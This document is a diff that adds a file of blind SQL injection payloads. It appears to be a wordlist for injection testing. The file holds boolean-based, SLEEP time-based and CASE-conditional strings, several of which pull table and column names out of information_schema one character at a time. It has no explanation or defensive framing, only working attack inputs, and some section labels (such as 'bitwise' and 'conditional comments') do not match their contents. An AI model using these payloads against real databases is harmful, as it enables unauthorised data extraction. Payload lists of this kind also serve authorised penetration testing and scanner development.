@@ -1,0 +1,28 @@
+# Boolean-based payloads
+' AND 1=1 --
+' AND 1=1 /*
+' AND 1=1 #
+' AND 1=0 --
+' AND 1=0 /*
+' AND 1=0 #
+
+# Time-based payloads
+' AND SLEEP(5) --
+' AND SLEEP(5) /*
+' AND SLEEP(5) #
+
+# Conditional payloads
+' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1),1,1)) > 97 --
+' AND ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns LIMIT 1),1,1)) = 97 --
+
+# Binary search payloads
+' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1),1,1)) > 128 --
+' AND ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1),1,1)) < 128 --
+
+# Bitwise payloads
+' AND (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END) --
+' AND (SELECT CASE WHEN (ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1),1,1)) > 97) THEN SLEEP(5) ELSE 0 END) --
+
+# Conditional comments
+' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE (SELECT 1 FROM (SELECT SLEEP(5))a) END) --
+' AND (SELECT CASE WHEN (ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1),1,1)) > 97) THEN 1 ELSE (SELECT 1 FROM (SELECT SLEEP(5))a) END) --
